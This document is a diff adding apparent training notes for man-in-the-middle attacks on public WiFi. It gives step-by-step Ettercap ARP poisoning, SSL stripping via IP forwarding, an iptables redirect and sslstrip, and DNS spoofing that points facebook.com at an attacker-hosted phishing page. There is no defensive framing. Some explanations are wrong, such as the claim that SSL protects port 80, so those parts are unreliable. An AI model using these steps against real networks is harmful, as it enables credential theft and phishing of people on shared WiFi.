@@ -1,0 +1,209 @@
+
+Network Attacks & MITM
+----------------------
+	Free WiFi
+		--> CCD
+		--> Railway Station
+		--> Star Bucks
+		--> Costa Cafe
+		--> Barista
+		--> Subway
+	Suppose, there is an intruder in the free wifi, and he is seeing all the data you are transmitting over the network.
+		Username
+		Passwords
+
+Which attack he is using?
+-------------------------
+	MiTM --> Man In The Middle Attack
+		An intruder is listening and seeing (sniffing and spoofing) the data transmitted over by the user. In other words, The attacker is standing between the two nodes of the communication, all the data is going through the attacker's device.
+
+ARP Poisioning
+==============
+	ARP --> Address Resolution Protocol
+	ARP Table  ---> Maps IP Address with the MAC Address
+	In this attack, the attacked poisons the ARP Cache.
+
+Ettercap ---> It is a tool which is used for performing MiTM and ARP Poisioning attack in the network. It is pre-installed in Kali Linux.
+
+Attack
+======
+
+1. Information Gathering
+	#arp-scan --local
+
+2. Start Ettercap
+	#ettercap -G
+		G ---> Graphical Version
+Start MiTM Attack
+	1. Goto "Sniff"
+	2. Click on "Unified Sniffing"
+	3. Select the interface ---> eth0
+	4. Goto on "Hosts"
+	5. Click on "Scan For Hosts"
+	6. Goto on "Hosts"
+	7. Click on "Hosts List"
+		192.168.228.137 ---> Target
+		Router --> Default Gateway
+					#route -n
+					192.168.228.2
+	8. Select default gateway -->  192.168.228.2 ---> Click on "Add To Target 1"
+	9. Select the Target IP Address --> 192.168.228.137 Click on "Add To Target 2"
+	10. Goto "MiTM"
+	11. Click on "ARP Poisioning"
+	12. Check on "Sniff Remote Connections" and click on "OK"
+	13. Goto "Start"
+	14. Click on "Start Sniffing"
+
+Working
+	http://www.vivastreet.co.in
+
+"Secure Connection Failed"
+		https://www.paytm.com
+		https://www.linkedin.com
+		https://www.instagram.com
+		https://www.onlinesbi.com
+		https://www.netflix.com
+
+HTTP --> Hyper Text Transfer Protocol
+HTTPS -> Hyper Text Transfer Protocol Secure
+										|
+										|--> S=Secure
+												|->SSL
+											Secure Socket Layer
+											443
+
+For Performing MiTM and ARP Poisioning on HTTPS websites. We need to do SSL Striping.
+For Performing sslstriping, we need to perform 3 steps
+	1. IP Forwarding
+	2. Traffic Redirection
+	3. SSL Striping
+
+1. IP Forwarding
+================
+	To Step up the IP Address and listen for the traffic which is transmitted by SSL.
+		#more /proc/sys/net/ipv4/ip_forward
+			0
+		#echo "1" > /proc/sys/net/ipv4/ip_forward
+		#more /proc/sys/net/ipv4/ip_forward
+			1
+
+2. Traffic Redirection
+======================
+	SSL works for port 80.
+	Data which is transmitted over port number 80, will be encrypted and protected by SSL. So we will redirect the data from port 80 to any random port, let's say port number 8080.
+		#locate etter.conf
+			/etc/ettercap/etter.conf
+			/usr/share/ettercap/doc/etter.conf.5.pdf
+			/usr/share/man/man5/etter.conf.5.gz
+		#nano /etc/ettercap/etter.conf
+			ec_uid = 0                # nobody is the default
+			ec_gid = 0                # nobody is the default
+
+			Scroll Down Until You Find Something Like This
+				#---------------
+				#     Linux
+				#---------------
+			You will find another line
+			#redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
+
+			Copy that line and paste it in notepad
+
+			#redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
+
+			we need to modify this command.
+
+		iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080 --> This is my commmand
+
+		#iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
+
+3. SSL Striping
+===============
+	Now all the thing is set up, we are good to go. Start the sslstriping tool and use it for port 8080
+
+		#sslstrip -l 8080
+			-l --> Listining
+
+Now we will perform MiTM and ARP Poisioning
+
+Start Ettercap
+	#ettercap -G
+		G ---> Graphical Version
+Start MiTM Attack
+	1. Goto "Sniff"
+	2. Click on "Unified Sniffing"
+	3. Select the interface ---> eth0
+	4. Goto on "Hosts"
+	5. Click on "Scan For Hosts"
+	6. Goto on "Hosts"
+	7. Click on "Hosts List"
+		192.168.228.137 ---> Target
+		Router --> Default Gateway
+					#route -n
+					192.168.228.2
+	8. Select default gateway -->  192.168.228.2 ---> Click on "Add To Target 1"
+	9. Select the Target IP Address --> 192.168.228.137 Click on "Add To Target 2"
+	10. Goto "MiTM"
+	11. Click on "ARP Poisioning"
+	12. Check on "Sniff Remote Connections" and click on "OK"
+	13. Goto "Start"
+	14. Click on "Start Sniffing"
+
+DNS Poisioning Attack | DNS Spoofing Attack
+===========================================
+It will let the user to redirect to phishing web page in the network
+www.facebook.com ----> It will go to my IP ADdress where i have hosted another phishing page.
+
+	#locate etter.conf
+		/etc/ettercap/etter.conf
+		/usr/share/ettercap/doc/etter.conf.5.pdf
+		/usr/share/man/man5/etter.conf.5.gz
+	#nano /etc/ettercap/etter.conf
+
+[privs]
+ec_uid = 1234234                # nobody is the default
+ec_gid = 4124123                # nobody is the default
+
+make ec_uid and ec_gid as 0
+I will scroll down until I find something written as
+	-----
+	LINUX
+	-----
+# if you use iptables:
+    #redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
+    # redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
+
+    Remove the hashed from both the lines
+
+# if you use iptables:
+    redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
+    redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
+
+#ettercap -G
+	Sniff ---> Unified Sniffing ---> Network Interface --> eth0
+	Hosts ---> Scan For Hosts
+	Hosts --> Hosts List
+	Select the target 1 as the default gateway
+							route -n
+							172.16.226.2
+	Select the target 2 as the victim machine
+							172.16.226.154
+	MiTM --> ARP Poisioning --> Sniff Remote Connection Only
+	Goto "Plugins" --> Manage the Plugins
+	Double click "dns_spoof"
+	Start ---> Start sniffing
+
+#locate etter.dns
+	/etc/ettercap/etter.dns
+#nano /etc/ettercap/etter.dns
+search where it is written
+www.microsoft.com    A    *.*.*.*
+
+enter below
+www.facebook.com 	A  	<your IP Address>
+facebook.com 	A  	<your IP Address>
+
+save the file and exit
+
+	#service apache2 start
+
+/var/www/html/ ---> place your phishing page here
